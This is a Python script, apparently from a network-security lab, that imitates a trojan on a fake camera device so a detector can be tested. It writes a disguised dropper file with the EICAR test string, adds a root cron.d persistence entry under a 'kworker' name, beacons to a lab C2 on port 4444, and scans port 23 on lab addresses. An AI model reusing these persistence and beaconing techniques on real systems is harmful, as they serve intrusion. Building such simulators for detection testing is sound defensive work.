"""HARMLESS trojan stand-in. Mimics indicators only; contains no payload and never leaves the lab network.

  * hidden dropper file + cron.d persistence entry
  * C2 beacon every ~15s to the fake C2 (c2:4444)
  * a short scan-like burst (connect() with 0.2s timeout to a few lab IPs, port 23)
  * one 'exfil' flow record (nothing is actually sent)
Stops itself and removes its persistence when the detector quarantines the device.
"""
import os
import random
import socket
import sys
import time

sys.path.insert(0, os.environ.get("COMMON_DIR", "/app/common"))
import flowlog  # noqa: E402

DEVICE = os.environ.get("DEVICE", "cam-garage")
C2 = os.environ.get("C2_HOST", "10.50.0.66")
C2_PORT = int(os.environ.get("C2_PORT", "4444"))
INTERVAL = float(os.environ.get("BEACON_INTERVAL", "15"))
QUARANTINE = os.path.join(os.environ.get("LAB_DATA_DIR", "/data"), "quarantine", DEVICE)
ARTIFACTS = os.environ.get("ARTIFACTS", "/tmp/.kworker-update:/etc/cron.d/kworker").split(":")
IP = flowlog.my_ip()


def install():
    with open(ARTIFACTS[0], "w") as f:
        f.write("SIMULATED TROJAN DROPPER - harmless marker\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n")
    os.makedirs(os.path.dirname(ARTIFACTS[1]), exist_ok=True)
    with open(ARTIFACTS[1], "w") as f:
        f.write("* * * * * root /usr/local/bin/kworker_upd.py  # simulated persistence\n")
    print(f"[sim] dropped {ARTIFACTS}", flush=True)


def cleanup():
    for p in ARTIFACTS:
        try:
            os.remove(p)
        except FileNotFoundError:
            pass


def beacon():
    t0 = time.time()
    out = random.randint(290, 330)
    try:
        with socket.create_connection((C2, C2_PORT), timeout=3) as s:
            s.sendall(f"id={DEVICE}&seq={int(t0)}".encode().ljust(out, b"."))
            s.recv(16)
    except OSError as e:
        print(f"[sim] beacon failed: {e}", flush=True)
    flowlog.log(DEVICE, IP, C2, C2_PORT, "TCP", out, 3, time.time() - t0)


def scan_burst():
    print("[sim] scan-like burst", flush=True)
    for i in range(20, 32):
        dst = f"10.50.0.{i}"
        t0 = time.time()
        s = socket.socket()
        s.settimeout(0.2)
        try:
            s.connect((dst, 23))
        except OSError:
            pass
        finally:
            s.close()
        flowlog.log(DEVICE, IP, dst, 23, "TCP", 60, 0, time.time() - t0)
        time.sleep(0.3)


def main():
    delay = int(os.environ.get("START_DELAY", "0"))
    print(f"[sim] starting in {delay}s", flush=True)
    time.sleep(delay)
    install()
    n = 0
    while True:
        if os.path.exists(QUARANTINE):
            cleanup()
            print("[sim] quarantine detected: persistence removed, process exiting", flush=True)
            return
        beacon()
        n += 1
        if n == 4:
            scan_burst()
        if n == 8:   # a log record only -- no data is transmitted
            flowlog.log(DEVICE, IP, "198.51.100.77", 443, "TCP", 8_500_000, 400, 20)
        time.sleep(INTERVAL * (1 + random.uniform(-0.04, 0.04)))


if __name__ == "__main__":
    main()
